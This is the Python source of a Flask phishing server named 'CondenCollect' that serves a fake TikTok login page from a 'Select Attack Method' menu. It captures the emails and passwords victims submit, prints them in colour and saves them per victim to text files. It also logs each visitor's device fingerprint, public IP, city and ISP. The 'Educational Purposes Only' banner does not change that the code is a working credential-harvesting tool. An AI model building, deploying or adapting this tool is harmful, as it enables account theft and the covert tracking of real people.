"""
Jutt Studio Attribution License (JSAL) 1.0

Copyright (c) 2025 Jutt Studio
"""
from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_cors import CORS
import logging
import os
import platform
import glob
import sys
import threading

# Set up basic logging to print credentials to the console
logger = logging.getLogger()
logger.setLevel(logging.INFO)
if logger.hasHandlers():
    logger.handlers.clear()
handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(logging.Formatter(fmt='%(message)s'))
logger.addHandler(handler)

# Suppress the default Flask/Werkzeug startup messages
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# --- ANSI Color Codes ---
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# --- Client Tracking ---
client_counter = 0
client_lock = threading.Lock()

app = Flask(__name__, template_folder='templates', static_folder='static')
# Enable CORS to allow the webpage to send data to this server
CORS(app)

# Route for the main page
@app.route('/')
def serve_index():
    # Render the selected HTML template from the 'templates' folder
    return render_template(selected_template)

# This route will handle receiving the credentials from the form
@app.route('/credentials', methods=['POST'])
def receive_credentials():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "Invalid JSON"}), 400

        # Extract data from the request
        email = data.get('email')
        password = data.get('password')

        # Log the received credentials to the console
        terminal_width = os.get_terminal_size().columns
        header_text = f"--- Client {client_counter} | Step 2: Credentials Captured ---"
        app.logger.info(f"{Colors.YELLOW}{header_text.center(terminal_width)}{Colors.ENDC}")
        app.logger.info(f"  {Colors.RED}Email/Phone:{Colors.ENDC} {email}")
        app.logger.info(f"  {Colors.RED}Password:{Colors.ENDC} {password}")
        app.logger.info(f"{Colors.YELLOW}{'-' * (len(header_text) + 4)}{Colors.ENDC}\n".center(terminal_width + len(Colors.YELLOW) + len(Colors.ENDC)))

        # Save credentials to the client's file
        filename = os.path.join("Data", f"Client {client_counter}.txt")
        with open(filename, "a") as f:
            f.write(f"\n--- Step 2: Credentials Captured ---\n")
            f.write(f"  Email/Phone: {email}\n")
            f.write(f"  Password: {password}\n")

        return jsonify({"status": "success"}), 200
    except Exception as e:
        app.logger.error(f"An error occurred: {e}")
        return jsonify({"status": "error", "message": "Server error"}), 500

@app.route('/device-info', methods=['POST'])
def receive_device_info():
    """Receives and logs device information when the page loads."""
    try:
        global client_counter
        with client_lock:
            client_counter += 1
            current_client_id = client_counter

        data = request.get_json()
        device = data.get('device', {})
        network = data.get('network', {})
        
        # Extract device info
        browser_info = device.get('browserInfo', {})
        hardware = device.get('hardware', {})
        screen = device.get('screen', {})
        battery_info = device.get('batteryInfo', 'N/A')

        # Extract network info
        public_ip = network.get('ip', 'Unknown')
        continent = network.get('continent_name', 'Unknown')
        country = network.get('country_name', 'Unknown')
        region = network.get('region', 'Unknown')
        city = network.get('city', 'Unknown')
        org = network.get('org', 'Unknown')
        isp = network.get('isp', 'Unknown')

        terminal_width = os.get_terminal_size().columns
        header_text = f"--- Client {current_client_id} | Step 1: Visitor Details ---"
        print(f"\n{Colors.YELLOW}{header_text.center(terminal_width)}{Colors.ENDC}")

        # --- Print Formatted Output ---
        print(f"{Colors.HEADER}╔══════════════════════════════════╗{Colors.ENDC}")
        print(f"{Colors.HEADER}║ {Colors.YELLOW}Device Information {Colors.HEADER}               ║{Colors.ENDC}")
        print(f"{Colors.HEADER}╚══════════════════════════════════╝{Colors.ENDC}")
        print(f"{Colors.GREEN}├─ {Colors.CYAN}Platform   : {Colors.ENDC}{browser_info.get('platform','Unknown')}")
        print(f"{Colors.GREEN}├─ {Colors.CYAN}CPU Cores  : {Colors.ENDC}{hardware.get('cpuCores','Unknown')}")
        print(f"{Colors.GREEN}├─ {Colors.CYAN}RAM        : {Colors.ENDC}{hardware.get('ram','Unknown')}")
        print(f"{Colors.GREEN}├─ {Colors.CYAN}GPU        : {Colors.ENDC}{hardware.get('gpu','Unknown')}")
        print(f"{Colors.GREEN}├─ {Colors.CYAN}Resolution : {Colors.ENDC}{screen.get('width','?')}x{screen.get('height','?')}")
        print(f"{Colors.GREEN}├─ {Colors.CYAN}Battery    : {Colors.ENDC}{battery_info.get('level', 'N/A') if isinstance(battery_info, dict) else battery_info}")
        print(f"{Colors.GREEN}└─ {Colors.CYAN}Browser    : {Colors.ENDC}{browser_info.get('userAgent','Unknown')}")
        
        print(f"\n{Colors.HEADER}╔══════════════════════════════════╗{Colors.ENDC}")
        print(f"{Colors.HEADER}║ {Colors.YELLOW}Network Details {Colors.HEADER}                  ║{Colors.ENDC}")
        print(f"{Colors.HEADER}╚══════════════════════════════════╝{Colors.ENDC}")
        print(f"{Colors.GREEN}├─ {Colors.CYAN}Public IP  : {Colors.ENDC}{public_ip}")
        print(f"{Colors.GREEN}├─ {Colors.CYAN}Continent  : {Colors.ENDC}{continent}")
        print(f"{Colors.GREEN}├─ {Colors.CYAN}Country    : {Colors.ENDC}{country}")
        print(f"{Colors.GREEN}├─ {Colors.CYAN}Region     : {Colors.ENDC}{region}")
        print(f"{Colors.GREEN}├─ {Colors.CYAN}City       : {Colors.ENDC}{city}")
        print(f"{Colors.GREEN}├─ {Colors.CYAN}Org        : {Colors.ENDC}{org}")
        print(f"{Colors.GREEN}└─ {Colors.CYAN}ISP        : {Colors.ENDC}{isp}")
        
        filename = os.path.join("Data", f"Client {current_client_id}.txt")
        print(f"\n{Colors.YELLOW}Full report saved to: {filename}{Colors.ENDC}")
        print(f"{Colors.YELLOW}{'-' * (len(header_text) + 4)}{Colors.ENDC}\n")

        # Save device and network info to the client's file
        filename = os.path.join("Data", f"Client {current_client_id}.txt")
        with open(filename, "w") as f:
            f.write(f"--- Client {current_client_id} | Step 1: Visitor Details ---\n\n")
            f.write("[ Device Information ]\n")
            f.write(f"  Platform   : {browser_info.get('platform','Unknown')}\n")
            f.write(f"  CPU Cores  : {hardware.get('cpuCores','Unknown')}\n")
            f.write(f"  RAM        : {hardware.get('ram','Unknown')}\n")
            f.write(f"  GPU        : {hardware.get('gpu','Unknown')}\n")
            f.write(f"  Resolution : {screen.get('width','?')}x{screen.get('height','?')}\n")
            f.write(f"  Battery    : {battery_info.get('level', 'N/A') if isinstance(battery_info, dict) else battery_info}\n")
            f.write(f"  Browser    : {browser_info.get('userAgent','Unknown')}\n\n")
            f.write("[ Network Details ]\n")
            f.write(f"  Public IP  : {public_ip}\n")
            f.write(f"  Continent  : {continent}\n")
            f.write(f"  Country    : {country}\n")
            f.write(f"  Region     : {region}\n")
            f.write(f"  City       : {city}\n")
            f.write(f"  Org        : {org}\n")
            f.write(f"  ISP        : {isp}\n")
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        return jsonify({"status": "error"}), 500

def clear_terminal():
    """Clears the terminal screen."""
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')

def select_template():
    """Presents a menu to select a template and returns the selected template name."""
    template_options = {
        "1": ("TikTok", "tiktok/tik.html")
    }

    print(f"{Colors.HEADER}{Colors.BOLD}Select Attack Method:{Colors.ENDC}")
    for key, (display_name, _) in template_options.items():
        print(f"  {Colors.GREEN}{key}{Colors.ENDC}. {display_name}")

    while True:
        try:
            prompt = f"{Colors.GREEN}> {Colors.ENDC}"
            choice = input(prompt)
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Exiting...{Colors.ENDC}")
            sys.exit(0)
        if choice.strip() in template_options:
            _, file_path = template_options[choice.strip()]
            return file_path
        else:
            print("Invalid selection. Please try again.")

if __name__ == '__main__':
    clear_terminal()
    
    # Create Data directory if it doesn't exist
    if not os.path.exists("Data"):
        os.makedirs("Data")

    width = 55
    subtitle = "Educational Purposes Only"
    title = "CondenCollect"
    description = "A sophisticated tool for security awareness."
    developed_by = "Developed by Jutt Studio"
    created_by = "Created by JS"
    contact_email = "Email: js434@proton.me"

    # Get terminal width for centering
    terminal_width = os.get_terminal_size().columns
    
    def print_centered_line(line):
        """Calculates padding and prints a colored line centered."""
        padding = " " * ((terminal_width - width) // 2)
        print(padding + line)
        
    # --- Initial Banner ---
    border_color = Colors.HEADER
    text_color = Colors.CYAN
    
    print_centered_line(f"{border_color}╔{'═' * (width - 2)}╗{Colors.ENDC}")
    print_centered_line(f"{border_color}║{Colors.ENDC} {Colors.BOLD}{title.center(width - 4)}{Colors.ENDC} {border_color}║{Colors.ENDC}")
    print_centered_line(f"{border_color}║{Colors.ENDC} {subtitle.center(width - 4)} {border_color}║{Colors.ENDC}")
    print_centered_line(f"{border_color}╠{'═' * (width - 2)}╣{Colors.ENDC}")
    print_centered_line(f"{border_color}║{Colors.ENDC} {text_color}{description.center(width - 4)}{Colors.ENDC} {border_color}║{Colors.ENDC}")
    print_centered_line(f"{border_color}║{Colors.ENDC} {text_color}{developed_by.center(width - 4)}{Colors.ENDC} {border_color}║{Colors.ENDC}")
    print_centered_line(f"{border_color}║{Colors.ENDC} {text_color}{created_by.center(width - 4)}{Colors.ENDC} {border_color}║{Colors.ENDC}")
    print_centered_line(f"{border_color}║{Colors.ENDC} {text_color}{contact_email.center(width - 4)}{Colors.ENDC} {border_color}║{Colors.ENDC}")
    print_centered_line(f"{border_color}╚{'═' * (width - 2)}╝{Colors.ENDC}\n")

    # Select template
    selected_template = select_template()

    # --- Final Status ---
    print(f"\n{Colors.GREEN}Selected Method:{Colors.ENDC} {selected_template.capitalize()}")
    print(f"{Colors.GREEN}Serving on:{Colors.ENDC} http://127.0.0.1:8000")
    
    app.run(host='0.0.0.0', port=8000, debug=False)